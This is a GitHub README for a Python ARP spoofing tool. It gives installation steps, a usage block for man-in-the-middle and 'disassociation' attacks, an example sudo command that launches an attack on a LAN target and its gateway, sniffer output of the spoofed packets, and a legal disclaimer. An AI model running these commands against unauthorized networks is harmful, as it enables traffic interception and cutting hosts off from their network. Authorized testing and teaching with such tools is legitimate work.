# Python 3 ARP Spoofing Tool

[![Python Version](https://img.shields.io/badge/python-3.x-blue?style=for-the-badge&logo=python)](https://github.com/EONRaider/Packet-Sniffer/)
[![Open Source? Yes!](https://img.shields.io/badge/Open%20Source%3F-Yes!-green?style=for-the-badge&logo=appveyor)](https://github.com/EONRaider/Packet-Sniffer/)
[![License](https://img.shields.io/github/license/EONRaider/Packet-Sniffer?style=for-the-badge)](https://github.com/EONRaider/Packet-Sniffer/blob/master/LICENSE)

[![Reddit](https://img.shields.io/reddit/user-karma/combined/eonraider?style=flat-square&logo=reddit)](https://www.reddit.com/user/eonraider)
[![Keybase](https://img.shields.io/badge/keybase-eonraider-blue?style=flat-square&logo=keybase)](https://keybase.io/eonraider)
[![Twitter](https://img.shields.io/twitter/follow/eon_raider?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)

A pure-Python ARP Cache Poisoning (a.k.a. "ARP Spoofing") tool that leverages a low-level 
assembly of Ethernet II frames and ARP packets.

This application maintains no dependencies on third-party modules and can be 
run by any Python 3.x interpreter.

## Installation

Simply clone this repository with `git clone` and execute the `arpspoof.py` file 
as described in the following **Usage** section.
```
user@host:~/DIR$ git clone https://github.com/EONRaider/Arp-Spoofer.git
```

## Usage
```
arpspoof.py [-h] (--attackermac MAC | --disassociate) --gatemac MAC --targetmac MAC 
            --gateip IP --targetip IP interface

Execute ARP Cache Poisoning attacks (a.k.a "ARP Spoofing") on local networks.

positional arguments:
  interface          Interface on the attacker machine to send packets from.

optional arguments:
  -h, --help         show this help message and exit
  --attackermac MAC  MAC address of the Network Interface Controller (NIC) used by 
                     the attacker.
  --disassociate     Execute a disassociation attack in which a randomized MAC 
                     address is set for the attacker machine, effectively making 
                     the target host send packets to a non-existent gateway.
  --gatemac MAC      MAC address of the NIC associated to the gateway.
  --targetmac MAC    MAC address of the NIC associated to the target.
  --gateip IP        IP address currently assigned to the gateway.
  --targetip IP      IP address currently assigned to the target.
  --interval TIME    Time in between each transmission of spoofed ARP packets 
                     (defaults to 0.5 seconds).
```


## Sample Output

- Example command to initiate an attack against a given target machine and gateway:
```
user@host:~$ sudo python3 arpspoof.py eth0 --attackermac 08:00:27:1f:6a:67 \
--gatemac 52:54:00:45:6a:69 --targetmac 08:00:27:83:dc:02 \
--gateip 10.0.1.1 --targetip 10.0.1.6

[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
```
- Example traffic displayed by [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer)
as the attack takes place:
```
[>] Packet #1 at 15:15:03:
    [+] MAC ......08:00:27:1f:6a:67 -> 52:54:00:45:6a:69
    [+] ARP ...............10.0.1.6 -> Is at 08:00:27:1f:6a:67
[>] Packet #2 at 15:15:03:
    [+] MAC ......08:00:27:1f:6a:67 -> 08:00:27:83:dc:02
    [+] ARP ...............10.0.1.1 -> Is at 08:00:27:1f:6a:67
```

## Legal Disclaimer
The use of code contained in this repository, either in part or in its totality, 
for engaging targets without prior mutual consent is illegal. **It is 
the end-user's responsibility to obey all applicable local, state 
and federal laws.**

Developers assume **no liability** and are not 
responsible for misuses or damages caused by any code contained 
in this repository in any event that, accidentally or otherwise, it comes to 
be utilized by a threat agent or unauthorized entity as a means to compromise the security, privacy, 
confidentiality, integrity and/or availability of systems and their associated 
 resources by leveraging the exploitation of known or unknown vulnerabilities present 
in said systems, including, but not limited to, the implementation of security controls, 
human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those circumstances 
directly related to **educational environments** or **authorized penetration testing 
engagements** whose declared purpose is that of finding and mitigating vulnerabilities 
in systems, limiting their exposure to compromises and exploits employed by malicious 
agents as defined in their respective threat models.
